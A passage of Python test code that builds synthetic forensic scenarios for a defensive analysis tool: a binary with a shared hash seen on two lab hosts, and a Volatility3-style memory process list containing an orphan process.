# --- Scenario D ---------------------------------------------------------------
def scenario_d() -> dict:
    """The same file on two hosts, reached a different way on each."""
    path = "/opt/vendor-agent/sync-helper"
    shared = _digest("cross-host-sync-helper")

    def host(name, minutes, parent):
        return {
            "endpoint": name,
            "execution": {"status": "success", "classification": HISTORICAL_EVIDENCE,
                          "complete": True, "synthetic": True, "warnings": [SYNTHETIC_BANNER],
                          "events": [_event("kernel audit log", minutes, observed={
                              "process_name": "sync-helper", "executable": path, "pid": 7000 + minutes,
                              "parent_process": parent, "user": "root",
                              "full_command_line": f"{path} --sync", "command_line": f"{path} --sync",
                              "hash": shared})]},
            "artifacts": {"artifacts": [dict(_artifact(path, minutes=minutes - 1), hash=shared,
                                             sha256=shared)],
                          "complete": True, "synthetic": True, "statistics": {"collected": 1},
                          "warnings": [SYNTHETIC_BANNER]},
            "network": {"status": "success", "classification": "CURRENT_OBSERVATION",
                        "synthetic": True, "complete": True, "warnings": [SYNTHETIC_BANNER],
                        "connections": [{"remote_address": "198.51.100.44", "remote_port": 8443,
                                         "status": "ESTABLISHED", "process_name": "sync-helper",
                                         "synthetic": True}],
                        "limits": {"packet_capture": False}},
        }

    hosts = [host("SYNTHETIC-LAB-A", 40, "systemd"), host("SYNTHETIC-LAB-B", 55, "cron")]
    return _result(
        "D", "The same binary running on two hosts",
        "Does an observable appear on more than one machine in this case?",
        events=hosts[0]["execution"]["events"] + hosts[1]["execution"]["events"],
        artifacts=hosts[0]["artifacts"]["artifacts"] + hosts[1]["artifacts"]["artifacts"],
        extra={"hosts": hosts, "shared_hash": shared},
        expected=("Cross-host correlation on the shared file hash and the shared remote address. "
                  "That the same file is in two places is a fact; whether it is vendor software or "
                  "something else is not decided here."))


# --- Scenario E ---------------------------------------------------------------
def scenario_e() -> dict:
    """A memory image result, with its fixture provenance attached.

    The rows below are shaped exactly as Volatility3's windows.pslist emits
    them and go through the real normalizer, so this scenario exercises the
    same path a genuine image would rather than a convenient stand-in.
    """
    from analysis.memory import analyze_memory_image

    memory = analyze_memory_image(fixture={"processes": [
        {"PID": 4, "PPID": 0, "ImageFileName": "System"},
        {"PID": 668, "PPID": 4, "ImageFileName": "smss.exe"},
        {"PID": 1204, "PPID": 668, "ImageFileName": "explorer.exe"},
        # The parent of this one is absent from the image on purpose.
        {"PID": 3390, "PPID": 2884, "ImageFileName": "updater-service.exe"},
    ]})
    memory["synthetic"] = True
    memory["warnings"] = list(memory.get("warnings", [])) + [SYNTHETIC_BANNER]
    for process in memory["processes"]:
        process["synthetic"] = True
    return _result(
        "E", "Memory image with a process whose parent is absent",
        "What was running when the image was taken, and does anything lack a parent?",
        extra={"memory": memory},
        expected=("Normalized memory processes plus an orphan-process finding, both labelled as "
                  "coming from a fixture so they cannot be read as evidence about a host."))


